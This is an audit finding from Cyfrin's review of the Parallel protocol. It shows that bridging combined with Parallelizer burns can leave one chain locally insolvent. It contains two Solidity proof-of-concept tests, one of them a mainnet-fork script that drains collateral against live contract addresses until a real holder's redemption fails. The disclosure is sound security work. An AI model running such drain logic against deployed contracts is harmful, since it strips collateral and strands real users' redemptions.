---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-03-04-cyfrin-parallel3-1-v2-0-3-6
ingested_at: '2026-08-23T05:04:32Z'
protocol_category: []
published_at: '2026-03-04T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-04-cyfrin-parallel3.1-v2.0.md
tags:
- firm:cyfrin
- report:2026-03-04-cyfrin-parallel3-1-v2-0
title: Interaction of `BridgeableTokenP` and `Parallelizer` allows local insolvency
vuln_class: []
---

# Interaction of `BridgeableTokenP` and `Parallelizer` allows local insolvency

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-03-04-cyfrin-parallel3.1-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-04-cyfrin-parallel3.1-v2.0.md)_

---

**Description:** The protocol is globally solvent but can become locally insolvent per chain due the interaction of bridging and collateralstate in the Parellizer contract.

`BridgeableTokenP` enforces bridge activity using per-chain daily credit/debit quotas, while Parallelizer enforces collateralization during mint/burn. These mechanisms are not coupled. As a result, bridged USDp can be minted onto a destination chain where it is no longer locally backed by Parallelizer. A user can bridge in, burn for collateral, and deplete local collateral. In the worst case this forces subsequent users to bridge elsewhere to exit.

Parallel has acknowledged this behavior and accepts it as an intended tradeoff, on the basis that users can always bridge to another chain to burn/redeem.

However, users lose local redemption guarantees, can incur friction from forced bridging, and face different economic conditions on other chains where fees or collateral mix differ.

**Impact:** Users can be forced to bridge to other chains in order to burn/redeem USDp.

**Proof of Concept:** Two PoCs demonstrate both the local drain behavior and chain-dependent "better deal" outcomes ([parallel-protocolMainnetBridgeInDrainFork.t.sol](https://github.com/parallel-protocol/parallel-core/blob/audit/100proof/Parallel-Parallelizer/tests/units/parallel-protocolMainnetBridgeInDrainFork.t.sol
), [parallel-protocolDepegBridgeBetterDeal.t.sol](https://github.com/parallel-protocol/parallel-core/blob/audit/100proof/Parallel-Parallelizer/tests/units/parallel-protocolDepegBridgeBetterDeal.t.sol
)). These PoCs use recent forked state from existing deployed contracts on Ethereum mainnet.
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import { Test, console } from "@forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import { DecimalString } from "../utils/DecimalString.sol";

interface ILiveParallelizer {
  function tokenP() external view returns (address);
  function getCollateralList() external view returns (address[] memory);
  function getIssuedByCollateral(address collateral) external view returns (uint256 stablecoinsFromCollateral, uint256 stablecoinsIssued);
  function quoteOut(uint256 amountOut, address tokenIn, address tokenOut) external view returns (uint256 amountIn);
  function swapExactInput(
    uint256 amountIn,
    uint256 amountOutMin,
    address tokenIn,
    address tokenOut,
    address to,
    uint256 deadline
  )
    external
    returns (uint256 amountOut);
}

interface ILiveBridgeableTokenP {
  function getPrincipalToken() external view returns (address);
  function getDailyCreditLimit() external view returns (uint256);
  function getDailyDebitLimit() external view returns (uint256);
}

/// @notice Mainnet fork PoC against live addresses at block 24,497,000.
/// @dev We model the "bridge-in happened on destination" state by crediting attacker principal directly.
/// This is equivalent to post-bridge state for destination solvency analysis.
contract CyfrinMainnetBridgeInDrainForkTest is Test {
  uint256 internal constant FORK_BLOCK = 24_497_000;
  address internal constant BRIDGEABLE_USDP = 0x78BB4882b77D74aD9B04Ab71fE8e61f72595823C;
  address internal constant PARALLELIZER_USDP = 0x6efeDDF9269c3683Ba516cb0e2124FE335F262a2;
  address internal constant DEFAULT_REAL_HOLDER = 0xA702f2DB3D37680FF4A382cA56750EA799d63960;

  ILiveBridgeableTokenP internal bridge;
  ILiveParallelizer internal parallelizer;
  IERC20 internal usdp;
  uint8 internal usdpDecimals;

  address internal victim;
  address internal attacker = makeAddr("attacker");
  address internal chosenCollateral;
  uint256 internal victimBalance;

  function setUp() external {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, FORK_BLOCK);

    bridge = ILiveBridgeableTokenP(BRIDGEABLE_USDP);
    parallelizer = ILiveParallelizer(PARALLELIZER_USDP);

    address tokenFromBridge = bridge.getPrincipalToken();
    address tokenFromParallelizer = parallelizer.tokenP();
    assertEq(tokenFromBridge, tokenFromParallelizer, "bridge principal != parallelizer tokenP");
    usdp = IERC20(tokenFromBridge);
    usdpDecimals = IERC20Metadata(tokenFromBridge).decimals();

    victim = vm.envOr("USDP_HOLDER", DEFAULT_REAL_HOLDER);
    victimBalance = usdp.balanceOf(victim);
    require(victimBalance > 0, "holder has 0 USDp at fork block");
  }

  function test_cyfrin_mainnetFork_bridgeInEquivalentDrainCanStrandRealHolder() external {
    console.log("=== Mainnet fork Bridge-in equivalent PoC ===");
    console.log("This test models destination-side post-bridge principal credit, then burns against destination collateral.");
    console.log("If victim can burn before attack but cannot after, the attack condition is demonstrated.");
    console.log("");
    console.log("Phase 0: Fork configuration");
    console.log("Fork block:", FORK_BLOCK);
    console.log("BridgeableTokenP:", BRIDGEABLE_USDP);
    console.log("Parallelizer:", PARALLELIZER_USDP);
    console.log("USDp token:", address(usdp));
    console.log("Victim holder:", victim);
    _logAmount("Victim USDp balance: ", victimBalance, usdpDecimals);
    _logAmount("Daily credit limit: ", bridge.getDailyCreditLimit(), usdpDecimals);
    _logAmount("Daily debit limit: ", bridge.getDailyDebitLimit(), usdpDecimals);
    console.log("");

    console.log("Phase 1: Find a collateral the real holder can currently burn into");
    (chosenCollateral,) = _findVictimBurnableCollateral(victimBalance);
    require(chosenCollateral != address(0), "no burnable collateral for victim");
    uint8 collateralDecimals = IERC20Metadata(chosenCollateral).decimals();
    uint256 collatBefore = IERC20(chosenCollateral).balanceOf(PARALLELIZER_USDP);
    (uint256 issuedFromChosenCollateral,) = parallelizer.getIssuedByCollateral(chosenCollateral);
    console.log("Chosen collateral:", chosenCollateral);
    _logAmount("Chosen collateral balance before attack: ", collatBefore, collateralDecimals);
    _logAmount("Issued from chosen collateral: ", issuedFromChosenCollateral, usdpDecimals);
    console.log("");

    // Pre-check that victim can burn/redeem this collateral before the attack state.
    console.log("Phase 2: Baseline victim check (pre-attack)");
    uint256 preAmountOut = _simulateVictimBurn(victimBalance, chosenCollateral);
    _logAmount("Victim redeemable amount before attack: ", preAmountOut, collateralDecimals);
    require(preAmountOut > 0, "victim cannot redeem before attack");
    console.log("");

    // Bridge-in equivalent state: attacker receives large principal on destination.
    // We intentionally set this to collateral-draining size.
    console.log("Phase 3: Size attacker principal as if large bridge-in credit occurred");
    // Drain just enough collateral so the same victim burn path can no longer be satisfied post-attack.
    uint256 drainTarget = collatBefore > preAmountOut ? (collatBefore - preAmountOut + 1) : 1;
    uint256 principalNeededForTarget = parallelizer.quoteOut(drainTarget, address(usdp), chosenCollateral);
    // Burn path is bounded by per-collateral issued accounting.
    uint256 attackPrincipalNeeded = principalNeededForTarget;
    if (attackPrincipalNeeded >= issuedFromChosenCollateral) {
      attackPrincipalNeeded = issuedFromChosenCollateral > 1 ? issuedFromChosenCollateral - 1 : 0;
    }
    require(attackPrincipalNeeded > 0, "no attack principal room");
    _logAmount("Target collateral drain: ", drainTarget, collateralDecimals);
    _logAmount("Principal needed for target: ", principalNeededForTarget, usdpDecimals);
    _logAmount("Attack principal used (bounded by issued): ", attackPrincipalNeeded, usdpDecimals);
    console.log("");

    console.log("Phase 4: Credit attacker principal (bridge-in equivalent) and drain collateral");
    deal(address(usdp), attacker, attackPrincipalNeeded, true);
    _logAmount("Attacker USDp before drain: ", usdp.balanceOf(attacker), usdpDecimals);

    vm.startPrank(attacker);
    usdp.approve(PARALLELIZER_USDP, type(uint256).max);
    uint256 drained = parallelizer.swapExactInput(
      attackPrincipalNeeded, 0, address(usdp), chosenCollateral, attacker, block.timestamp + 1 days
    );
    vm.stopPrank();
    _logAmount("Collateral drained by attacker: ", drained, collateralDecimals);
    _logAmount("Attacker USDp after drain: ", usdp.balanceOf(attacker), usdpDecimals);
    _logAmount("Attacker collateral after drain: ", IERC20(chosenCollateral).balanceOf(attacker), collateralDecimals);

    uint256 collatAfter = IERC20(chosenCollateral).balanceOf(PARALLELIZER_USDP);
    _logAmount("Chosen collateral balance after attack: ", collatAfter, collateralDecimals);
    console.log("");

    console.log("Phase 5: Victim post-attack check (expected revert)");
    _logAmount("Victim USDp before failed burn: ", usdp.balanceOf(victim), usdpDecimals);
    vm.startPrank(victim);
    usdp.approve(PARALLELIZER_USDP, type(uint256).max);
    vm.expectRevert();
    parallelizer.swapExactInput(victimBalance, 0, address(usdp), chosenCollateral, victim, block.timestamp + 1 days);
    vm.stopPrank();
    console.log("Victim burn reverted as expected after attacker drain.");
  }

  function _logAmount(string memory label, uint256 amount, uint8 decimals) internal pure {
    console.log(string.concat(label, DecimalString.formatFixed(amount, decimals)));
  }

  function _simulateVictimBurn(uint256 amountIn, address collateral) internal returns (uint256) {
    uint256 snap = vm.snapshotState();
    vm.startPrank(victim);
    usdp.approve(PARALLELIZER_USDP, type(uint256).max);
    uint256 amountOut =
      parallelizer.swapExactInput(amountIn, 0, address(usdp), collateral, victim, block.timestamp + 1 days);
    vm.stopPrank();
    vm.revertToState(snap);
    return amountOut;
  }

  function _findVictimBurnableCollateral(uint256 amountIn) internal returns (address collateral, uint256 amountOut) {
    address[] memory list = parallelizer.getCollateralList();
    for (uint256 i = 0; i < list.length; ++i) {
      address c = list[i];
      if (IERC20(c).balanceOf(PARALLELIZER_USDP) == 0) continue;
      uint256 snap = vm.snapshotState();
      try this._tryBurnOnCollateral(amountIn, c) returns (uint256 out) {
        vm.revertToState(snap);
        if (out > 0) return (c, out);
      } catch {
        vm.revertToState(snap);
      }
    }
  }

  function _tryBurnOnCollateral(uint256 amountIn, address collateral) external returns (uint256) {
    vm.startPrank(victim);
    usdp.approve(PARALLELIZER_USDP, type(uint256).max);
    uint256 out = parallelizer.swapExactInput(
      amountIn, 0, address(usdp), collateral, victim, block.timestamp + 1 days
    );
    vm.stopPrank();
    return out;
  }
}
```

```solidity
// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.28;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { console } from "@forge-std/console.sol";

import { ITokenP } from "contracts/interfaces/ITokenP.sol";
import { IParallelizer } from "contracts/interfaces/IParallelizer.sol";
import { CollateralSetup, Test } from "contracts/parallelizer/configs/Test.sol";

import { MockTokenPermit } from "tests/mock/MockTokenPermit.sol";
import { Fixture } from "../Fixture.sol";
import { DecimalString } from "../utils/DecimalString.sol";
import "contracts/utils/Constants.sol";

contract CyfrinDepegBridgeBetterDealTest is Fixture {
  IParallelizer internal parallelizerChain2;
  ITokenP internal tokenPChain2;
  address internal configChain2;

  uint256 internal constant USER_BURN_AMOUNT = 2_000 * BASE_18;
  address internal constant PEGGED_BURN_ASSET = address(0); // placeholder not used directly

  function setUp() public override {
    super.setUp();

    tokenPChain2 = ITokenP(address(new MockTokenPermit("agEUR_2", "agEUR_2", 18)));
    vm.label(address(tokenPChain2), "tokenPChain2");

    configChain2 = address(new Test());
    parallelizerChain2 = deployReplicaParallelizer(
      configChain2,
      abi.encodeWithSelector(
        Test.initialize.selector,
        address(accessManager),
        tokenPChain2,
        CollateralSetup(address(eurA), address(oracleA)),
        CollateralSetup(address(eurB), address(oracleB)),
        CollateralSetup(address(eurY), address(oracleY))
      )
    );
    vm.label(address(parallelizerChain2), "ParallelizerChain2");

    vm.startPrank(governor);
    accessManager.setTargetFunctionRole(
      address(parallelizerChain2), getParallelizerGovernorSelectorAccess(), GOVERNOR_ROLE
    );
    accessManager.setTargetFunctionRole(
      address(parallelizerChain2), getParallelizerGuardianSelectorAccess(), GUARDIAN_ROLE
    );
    vm.stopPrank();

    // Keep mint fees flat/neutral; use the same burn fee curve on both chains.
    _setMintFeesZero(address(parallelizer));
    _setMintFeesZero(address(parallelizerChain2));
    _setBurnCurveSameOnBothChains(address(parallelizer));
    _setBurnCurveSameOnBothChains(address(parallelizerChain2));

    // Chain 1: low EUR_Y proportion (worse burn fee for burning into EUR_Y).
    _mintStableOn(address(parallelizer), address(tokenP), governor, address(eurA), 900_000 * BASE_6, treasury);
    _mintStableOn(address(parallelizer), address(tokenP), governorAndGuardian, address(eurB), 300_000 * BASE_12, treasury);
    _mintStableOn(address(parallelizer), address(tokenP), guardian, address(eurY), 100_000 * BASE_18, treasury);

    // Chain 2: high EUR_Y proportion (better burn fee for burning into EUR_Y).
    _mintStableOn(address(parallelizerChain2), address(tokenPChain2), governor, address(eurA), 100_000 * BASE_6, treasury);
    _mintStableOn(
      address(parallelizerChain2), address(tokenPChain2), governorAndGuardian, address(eurB), 200_000 * BASE_12, treasury
    );
    _mintStableOn(address(parallelizerChain2), address(tokenPChain2), guardian, address(eurY), 900_000 * BASE_18, treasury);

    // Give Alice stablecoins on each chain so she can burn in both.
    _mintStableOn(address(parallelizer), address(tokenP), governorAndGuardian, address(eurB), 20_000 * BASE_12, alice);
    _mintStableOn(
      address(parallelizerChain2), address(tokenPChain2), governorAndGuardian, address(eurB), 20_000 * BASE_12, alice
    );

    vm.startPrank(alice);
    IERC20(address(tokenP)).approve(address(parallelizer), type(uint256).max);
    IERC20(address(tokenPChain2)).approve(address(parallelizerChain2), type(uint256).max);
    vm.stopPrank();
  }

  function test_cyfrin_BurnIntoPeggedAsset_FeesDifferByChainComposition() external {
    console.log("=== Burns-only comparison into pegged EUR_Y ===");
    _logAmount("Burn amount (stable): ", USER_BURN_AMOUNT, 18);
    console.log("Burn target asset: EUR_Y (pegged)");
    console.log("");

    console.log("Initial collateral mixes:");
    _logChainInventory("Chain 1", address(parallelizer));
    _logChainInventory("Chain 2", address(parallelizerChain2));
    console.log("");

    uint256 quotedOutChain1 = parallelizer.quoteIn(USER_BURN_AMOUNT, address(tokenP), address(eurY));
    uint256 quotedOutChain2 = parallelizerChain2.quoteIn(USER_BURN_AMOUNT, address(tokenPChain2), address(eurY));

    uint256 chain1FeeAmount = USER_BURN_AMOUNT > quotedOutChain1 ? USER_BURN_AMOUNT - quotedOutChain1 : 0;
    uint256 chain2FeeAmount = USER_BURN_AMOUNT > quotedOutChain2 ? USER_BURN_AMOUNT - quotedOutChain2 : 0;
    uint256 chain1FeeBps = (chain1FeeAmount * 10_000) / USER_BURN_AMOUNT;
    uint256 chain2FeeBps = (chain2FeeAmount * 10_000) / USER_BURN_AMOUNT;

    _logAmount("Quoted EUR_Y out on chain 1: ", quotedOutChain1, 18);
    _logAmount("Quoted EUR_Y out on chain 2: ", quotedOutChain2, 18);
    _logAmount("Implied fee amount chain 1: ", chain1FeeAmount, 18);
    _logAmount("Implied fee amount chain 2: ", chain2FeeAmount, 18);
    _logAmount("Implied fee bps chain 1: ", chain1FeeBps, 0);
    _logAmount("Implied fee bps chain 2: ", chain2FeeBps, 0);
    console.log("");

    vm.startPrank(alice);
    uint256 outChain1 = parallelizer.swapExactInput(
      USER_BURN_AMOUNT, 0, address(tokenP), address(eurY), alice, block.timestamp + 1 hours
    );
    vm.stopPrank();
    vm.startPrank(alice);
    uint256 outChain2 = parallelizerChain2.swapExactInput(
      USER_BURN_AMOUNT, 0, address(tokenPChain2), address(eurY), alice, block.timestamp + 1 hours
    );
    vm.stopPrank();

    _logAmount("Actual EUR_Y out on chain 1: ", outChain1, 18);
    _logAmount("Actual EUR_Y out on chain 2: ", outChain2, 18);
    _logAmount("Actual output edge (chain2 - chain1): ", outChain2 - outChain1, 18);

    assertEq(outChain1, quotedOutChain1, "quote must match execution on chain 1");
    assertEq(outChain2, quotedOutChain2, "quote must match execution on chain 2");
    assertGt(chain1FeeBps, chain2FeeBps, "Expected lower computed burn fee on chain 2");
    assertGt(outChain2, outChain1, "Expected better pegged-asset burn outcome on chain 2");
  }

  function _setMintFeesZero(address target) internal {
    uint64[] memory xMint = new uint64[](1);
    xMint[0] = uint64(0);
    int64[] memory yMint = new int64[](1);
    yMint[0] = 0;

    vm.startPrank(guardian);
    IParallelizer(target).setFees(address(eurA), xMint, yMint, true);
    IParallelizer(target).setFees(address(eurB), xMint, yMint, true);
    IParallelizer(target).setFees(address(eurY), xMint, yMint, true);
    vm.stopPrank();
  }

  function _setBurnCurveSameOnBothChains(address target) internal {
    // Burn curve constraints:
    // - x strictly decreasing from BASE_9
    // - y strictly increasing
    // - y[0] == y[1] when n>1
    uint64[] memory xBurn = new uint64[](3);
    xBurn[0] = uint64(BASE_9);
    xBurn[1] = 800_000_000;
    xBurn[2] = 300_000_000;

    int64[] memory yBurn = new int64[](3);
    yBurn[0] = 0;
    yBurn[1] = 0;
    yBurn[2] = 200_000_000; // up to 20% fee when exposure gets low

    vm.startPrank(guardian);
    IParallelizer(target).setFees(address(eurA), xBurn, yBurn, false);
    IParallelizer(target).setFees(address(eurB), xBurn, yBurn, false);
    IParallelizer(target).setFees(address(eurY), xBurn, yBurn, false);
    vm.stopPrank();
  }

  function _mintStableOn(
    address target,
    address stableToken,
    address payer,
    address collateral,
    uint256 amountIn,
    address receiver
  )
    internal
    returns (uint256 minted)
  {
    vm.startPrank(payer);
    deal(collateral, payer, amountIn);
    IERC20(collateral).approve(target, type(uint256).max);
    minted = IParallelizer(target).swapExactInput(amountIn, 0, collateral, stableToken, receiver, block.timestamp + 1 hours);
    vm.stopPrank();
  }

  function _logChainInventory(string memory name, address target) internal view {
    console.log(string.concat("  ", name, ":"));
    _logAmount("    eurA balance: ", IERC20(address(eurA)).balanceOf(target), 6);
    _logAmount("    eurB balance: ", IERC20(address(eurB)).balanceOf(target), 12);
    _logAmount("    eurY balance: ", IERC20(address(eurY)).balanceOf(target), 18);
  }

  function _logAmount(string memory label, uint256 amount, uint8 decimals) internal pure {
    console.log(string.concat(label, DecimalString.formatFixed(amount, decimals)));
  }
}
```

**Parallel:** Acknowledged.

**Cyfrin:** Added an operational note on the executive summary to document this behavior.
